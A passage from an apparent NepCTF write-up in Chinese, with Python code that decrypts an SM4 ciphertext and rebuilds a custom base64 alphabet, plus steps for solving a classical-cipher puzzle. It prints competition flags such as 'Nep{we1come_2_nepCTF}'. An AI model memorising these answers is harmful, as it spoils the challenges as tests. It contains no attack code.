class="string">&#x27;fb&#x27;</span>, <span class="string">&#x27;2c&#x27;</span>, <span class="string">&#x27;05&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;2b&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;9a&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;2a&#x27;</span>, <span class="string">&#x27;be&#x27;</span>, <span class="string">&#x27;04&#x27;</span>, <span class="string">&#x27;c3&#x27;</span>, <span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;26&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;86&#x27;</span>, <span class="string">&#x27;06&#x27;</span>, <span class="string">&#x27;99&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;9c&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;ef&#x27;</span>, <span class="string">&#x27;98&#x27;</span>, <span class="string">&#x27;7a&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;ed&#x27;</span>, <span class="string">&#x27;cf&#x27;</span>, <span class="string">&#x27;ac&#x27;</span>, <span class="string">&#x27;62&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;e4&#x27;</span>, <span class="string">&#x27;b3&#x27;</span>, <span class="string">&#x27;1c&#x27;</span>, <span class="string">&#x27;a9&#x27;</span>, <span class="string">&#x27;c9&#x27;</span>, <span class="string">&#x27;08&#x27;</span>, <span class="string">&#x27;e8&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;fa&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;8f&#x27;</span>, <span class="string">&#x27;3f&#x27;</span>, <span class="string">&#x27;a6&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;07&#x27;</span>, <span class="string">&#x27;a7&#x27;</span>, <span class="string">&#x27;fc&#x27;</span>, <span class="string">&#x27;f3&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;ba&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;3c&#x27;</span>, <span class="string">&#x27;19&#x27;</span>, <span class="string">&#x27;e6&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;4f&#x27;</span>, <span class="string">&#x27;a8&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;6b&#x27;</span>, <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;b2&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;da&#x27;</span>, <span class="string">&#x27;8b&#x27;</span>, <span class="string">&#x27;f8&#x27;</span>, <span class="string">&#x27;eb&#x27;</span>, <span class="string">&#x27;0f&#x27;</span>, <span class="string">&#x27;4b&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;9d&#x27;</span>, <span class="string">&#x27;35&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;1e&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;0e&#x27;</span>, <span class="string">&#x27;5e&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;d1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span>, <span class="string">&#x27;25&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;7c&#x27;</span>, <span class="string">&#x27;3b&#x27;</span>, <span class="string">&#x27;01&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;87&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;d4&#x27;</span>, <span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;9f&#x27;</span>, <span class="string">&#x27;d3&#x27;</span>, <span class="string">&#x27;27&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;4c&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;02&#x27;</span>, <span class="string">&#x27;e7&#x27;</span>, <span class="string">&#x27;a0&#x27;</span>, <span class="string">&#x27;c4&#x27;</span>, <span class="string">&#x27;c8&#x27;</span>, <span class="string">&#x27;9e&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;ea&#x27;</span>, <span class="string">&#x27;bf&#x27;</span>, <span class="string">&#x27;8a&#x27;</span>, <span class="string">&#x27;d2&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;c7&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;b5&#x27;</span>, <span class="string">&#x27;a3&#x27;</span>, <span class="string">&#x27;f7&#x27;</span>, <span class="string">&#x27;f2&#x27;</span>, <span class="string">&#x27;ce&#x27;</span>, <span class="string">&#x27;f9&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;15&#x27;</span>, <span class="string">&#x27;a1&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;e0&#x27;</span>, <span class="string">&#x27;ae&#x27;</span>, <span class="string">&#x27;5d&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="string">&#x27;9b&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;1a&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;ad&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;f5&#x27;</span>, <span class="string">&#x27;8c&#x27;</span>, <span class="string">&#x27;b1&#x27;</span>, <span class="string">&#x27;e3&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;1d&#x27;</span>, <span class="string">&#x27;f6&#x27;</span>, <span class="string">&#x27;e2&#x27;</span>, <span class="string">&#x27;2e&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;ca&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;c0&#x27;</span>, <span class="string">&#x27;29&#x27;</span>, <span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>, <span class="string">&#x27;0d&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;4e&#x27;</span>, <span class="string">&#x27;6f&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;d5&#x27;</span>, <span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;de&#x27;</span>, <span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;8e&#x27;</span>, <span class="string">&#x27;2f&#x27;</span>, <span class="string">&#x27;03&#x27;</span>, <span class="string">&#x27;ff&#x27;</span>, <span class="string">&#x27;6a&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;6d&#x27;</span>, <span class="string">&#x27;6c&#x27;</span>, <span class="string">&#x27;5b&#x27;</span>, <span class="string">&#x27;51&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;8d&#x27;</span>, <span class="string">&#x27;1b&#x27;</span>, <span class="string">&#x27;af&#x27;</span>, <span class="string">&#x27;92&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;dd&#x27;</span>, <span class="string">&#x27;bc&#x27;</span>, <span class="string">&#x27;7f&#x27;</span>, <span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;d9&#x27;</span>, <span class="string">&#x27;5c&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;1f&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;5a&#x27;</span>, <span class="string">&#x27;d8&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;0a&#x27;</span>, <span class="string">&#x27;c1&#x27;</span>, <span class="string">&#x27;31&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;a5&#x27;</span>, <span class="string">&#x27;cd&#x27;</span>, <span class="string">&#x27;7b&#x27;</span>, <span class="string">&#x27;bd&#x27;</span>, <span class="string">&#x27;2d&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;d0&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;b8&#x27;</span>, <span class="string">&#x27;e5&#x27;</span>, <span class="string">&#x27;b4&#x27;</span>, <span class="string">&#x27;b0&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;89&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;4a&#x27;</span>, <span class="string">&#x27;0c&#x27;</span>, <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;7e&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;b9&#x27;</span>, <span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;c5&#x27;</span>, <span class="string">&#x27;6e&#x27;</span>, <span class="string">&#x27;c6&#x27;</span>, <span class="string">&#x27;84&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;f0&#x27;</span>, <span class="string">&#x27;7d&#x27;</span>, <span class="string">&#x27;ec&#x27;</span>, <span class="string">&#x27;3a&#x27;</span>, <span class="string">&#x27;dc&#x27;</span>, <span class="string">&#x27;4d&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;ee&#x27;</span>, <span class="string">&#x27;5f&#x27;</span>, <span class="string">&#x27;3e&#x27;</span>, <span class="string">&#x27;d7&#x27;</span>, <span class="string">&#x27;cb&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;48&#x27;</span>,]</span><br><span class="line">FK = [<span class="string">&#x27;a3b1bac6&#x27;</span>, <span class="string">&#x27;56aa3350&#x27;</span>, <span class="string">&#x27;677d9197&#x27;</span>, <span class="string">&#x27;b27022dc&#x27;</span>]</span><br><span class="line">CK = [<span class="string">&#x27;00070e15&#x27;</span>, <span class="string">&#x27;1c232a31&#x27;</span>, <span class="string">&#x27;383f464d&#x27;</span>, <span class="string">&#x27;545b6269&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;70777e85&#x27;</span>, <span class="string">&#x27;8c939aa1&#x27;</span>, <span class="string">&#x27;a8afb6bd&#x27;</span>, <span class="string">&#x27;c4cbd2d9&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;e0e7eef5&#x27;</span>, <span class="string">&#x27;fc030a11&#x27;</span>, <span class="string">&#x27;181f262d&#x27;</span>, <span class="string">&#x27;343b4249&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;50575e65&#x27;</span>, <span class="string">&#x27;6c737a81&#x27;</span>, <span class="string">&#x27;888f969d&#x27;</span>, <span class="string">&#x27;a4abb2b9&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;c0c7ced5&#x27;</span>, <span class="string">&#x27;dce3eaf1&#x27;</span>, <span class="string">&#x27;f8ff060d&#x27;</span>, <span class="string">&#x27;141b2229&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;30373e45&#x27;</span>, <span class="string">&#x27;4c535a61&#x27;</span>, <span class="string">&#x27;686f767d&#x27;</span>, <span class="string">&#x27;848b9299&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;a0a7aeb5&#x27;</span>, <span class="string">&#x27;bcc3cad1&#x27;</span>, <span class="string">&#x27;d8dfe6ed&#x27;</span>, <span class="string">&#x27;f4fb0209&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;10171e25&#x27;</span>, <span class="string">&#x27;2c333a41&#x27;</span>, <span class="string">&#x27;484f565d&#x27;</span>, <span class="string">&#x27;646b7279&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span>(<span class="params"><span class="built_in">list</span>,n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>[n:] + <span class="built_in">list</span>[:n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group</span>(<span class="params"><span class="built_in">list</span>, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">list</span>), n):</span><br><span class="line">        <span class="keyword">yield</span> <span class="built_in">list</span>[i:i + n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    a1 = <span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line">    b1 = <span class="built_in">int</span>(b,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        A = <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(a1^b1))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        A = <span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(a1^b1))</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_function</span>(<span class="params">k0,k1,k2,k3,rk,mod</span>):</span></span><br><span class="line">    k = xor(xor(xor(k1,k2),k3),rk)</span><br><span class="line">    Tr = T(k,mod)</span><br><span class="line">    rki = xor(k0,Tr)</span><br><span class="line">    <span class="keyword">return</span> rki</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span>(<span class="params">A,mod</span>):</span></span><br><span class="line">    T = linear(S(A),mod)</span><br><span class="line">    <span class="keyword">return</span> T</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S</span>(<span class="params">A</span>):</span></span><br><span class="line">    A1 = []</span><br><span class="line">    A2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(A,<span class="number">2</span>):</span><br><span class="line">        A1.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        l = <span class="built_in">int</span>(A1[i],<span class="number">16</span>)</span><br><span class="line">        A2[i] = <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(SBOX[l],<span class="number">16</span>))</span><br><span class="line">    A2 = <span class="string">&#x27;&#x27;</span>.join(A2)</span><br><span class="line">    <span class="keyword">return</span> A2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear</span>(<span class="params">B,mod</span>):</span></span><br><span class="line">    B1 = <span class="built_in">list</span>(B)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        B1[i] = <span class="string">&#x27;&#123;:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(B1[i],<span class="number">16</span>))</span><br><span class="line">    B1 = <span class="string">&#x27;&#x27;</span>.join(B1)</span><br><span class="line">    B1_2= left(B1,<span class="number">2</span>)</span><br><span class="line">    B1_10 = left(B1,<span class="number">10</span>)</span><br><span class="line">    B1_18 = left(B1,<span class="number">18</span>)</span><br><span class="line">    B1_24 = left(B1,<span class="number">24</span>)</span><br><span class="line">    B1_13 = left(B1,<span class="number">13</span>)</span><br><span class="line">    B1_23 = left(B1,<span class="number">23</span>)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">&#x27;enc&#x27;</span> <span class="keyword">or</span> mod ==  <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">        BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24)</span><br><span class="line">    <span class="keyword">elif</span> mod == <span class="string">&#x27;extend&#x27;</span>:</span><br><span class="line">        BX = xor(xor(B1,B1_13),B1_23)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;模式输入错误&quot;</span></span><br><span class="line">    BX = <span class="string">&#x27;%x&#x27;</span>%<span class="built_in">int</span>(BX, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> BX</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    MK = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(key,<span class="number">8</span>):</span><br><span class="line">        MK.append(i)</span><br><span class="line">    key0 = xor(MK[<span class="number">0</span>],FK[<span class="number">0</span>])</span><br><span class="line">    key1 = xor(MK[<span class="number">1</span>],FK[<span class="number">1</span>])</span><br><span class="line">    key2 = xor(MK[<span class="number">2</span>],FK[<span class="number">2</span>])</span><br><span class="line">    key3 = xor(MK[<span class="number">3</span>],FK[<span class="number">3</span>])</span><br><span class="line">    keylist = [key0,key1,key2,key3]</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        a = round_function(keylist[i],keylist[i+<span class="number">1</span>],keylist[i+<span class="number">2</span>],keylist[i+<span class="number">3</span>],CK[i],mod=<span class="string">&#x27;extend&#x27;</span>)</span><br><span class="line">        keylist.append(a)</span><br><span class="line">        rk.append(a)</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_ecb</span>(<span class="params">key,input_data,mod</span>):</span></span><br><span class="line">    data = []</span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">        data.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> mod == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">        data.append(ldata)</span><br><span class="line">    out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">    out_data = <span class="string">&#x27;&#x27;</span>.join(out_data)</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_cbc</span>(<span class="params">key,input_data,iv,mod</span>):</span></span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">        input_data = xor(input_data,iv)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">&#x27;&#x27;</span>.join(out_data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">&#x27;&#x27;</span>.join(out_data)</span><br><span class="line">        out_data = xor(out_data,iv)</span><br><span class="line">        out_data = <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(out_data, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line">print(get_sm4_ecb(key = <span class="string">&#x27;6963616e74656c6c756173696d706c65&#x27;</span>,</span><br><span class="line">                  input_data = <span class="string">&#x27;021789c8d9dafbe50e478c894c1d7ab9&#x27;</span>,</span><br><span class="line">                  mod = <span class="string">&#x27;dec&#x27;</span>))</span><br><span class="line"><span class="comment">#776531636f6d655f325f6e6570435446</span></span><br><span class="line">print(long_to_bytes(<span class="number">0x776531636f6d655f325f6e6570435446</span>))</span><br><span class="line"><span class="comment">#b&#x27;we1come_2_nepCTF&#x27;</span></span><br></pre></td></tr></table></figure><p>flag:Nep{we1come_2_nepCTF}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-你们一天天的不写代码，难道是在等爱情吗"><a href="#1-你们一天天的不写代码，难道是在等爱情吗" class="headerlink" title="1.你们一天天的不写代码，难道是在等爱情吗"></a>1.你们一天天的不写代码，难道是在等爱情吗</h3><p>已知有猪圈密码及其变种，数字盲文，古精灵语，跳舞的小人，还有两个其实不知道。</p><p>先空着，然后来猜<del>kP_TJw}r{1~~HWw$v0v!?c@bvUm?，</del>代表未知，，根据题意，w型栅栏3，凯撒十三得到：Nep{x1@<del>C</del>oU_JinG$HiW0zij!??}</p><p>然后猜意思，发现是小丑竟是我自己，那么填上对应大小写，得到flag：Nep{x1@oChoU_JinG$HiW0zij!??}</p><h3 id="2-Base"><a href="#2-Base" class="headerlink" title="2.Base"></a>2.Base</h3><p>其实就是base64换表，先根据加密的m还原表，再用表解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line"></span><br><span class="line">  res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  binstr=[ <span class="built_in">bin</span>(<span class="built_in">ord</span>(s[i])).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line"></span><br><span class="line">  p1=<span class="built_in">len</span>(binstr) // <span class="number">3</span></span><br><span class="line"></span><br><span class="line">  p2=<span class="built_in">len</span>(binstr) % <span class="number">3</span></span><br><span class="line"></span><br><span class="line">  part1 = binstr[<span class="number">0</span>:<span class="number">3</span>*p1]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  N=[]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p1):</span><br><span class="line"></span><br><span class="line">    str_p1=binstr[i*<span class="number">3</span>]+binstr[i*<span class="number">3</span>+<span class="number">1</span>]+binstr[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    tmp_str = [str_p1[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp_str:</span><br><span class="line"></span><br><span class="line">      N.append(<span class="built_in">int</span>(i,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> p2:</span><br><span class="line"></span><br><span class="line">    part2 = binstr[<span class="number">3</span>*p1:]</span><br><span class="line"></span><br><span class="line">    str_p2 = <span class="string">&#x27;&#x27;</span>.join(part2)+(<span class="number">3</span>-p2)*<span class="string">&#x27;0&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    tmp_str = [str_p2[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:p2+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp_str:</span><br><span class="line"></span><br><span class="line">      N.append(<span class="built_in">int</span>(i,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> N</span><br><span class="line"></span><br><span class="line">m=<span class="string">&quot;rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P&quot;</span></span><br><span class="line"></span><br><span class="line">encode_m=<span class="string">&quot;2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa&quot;</span></span><br><span class="line"></span><br><span class="line">N=encode(m)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">b_char=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(N))]</span><br><span class="line"></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> N:</span><br><span class="line"></span><br><span class="line">  b_char[i]=encode_m[j]</span><br><span class="line"></span><br><span class="line">  j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(b_char)</span><br></pre></td></tr></table></figure><p>求出表是不完整的，[‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, 0, ‘h’, 0, ‘j’, 0, ‘l’, 0, ‘n’, 0, 0, 0, ‘r’, 0, ‘t’, ‘u’, ‘v’, ‘w’, ‘x’, ‘y’, ‘z’, ‘0’, 0, ‘2’, ‘3’, ‘4’, 0, 0, ‘7’, 0, ‘9’, ‘A’, ‘B’, ‘C’, ‘D’, 0, 0, 0, 0, 0, ‘J’, 0, ‘L’, 0, ‘N’, ‘O’, ‘P’, ‘Q’, ‘R’, 0, ‘T’, ‘U’, ‘V’, 0, 0, 0, ‘Z’，猜测是按顺序来的，a-z,0-9,A-Z.</p><p>再base64换表解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 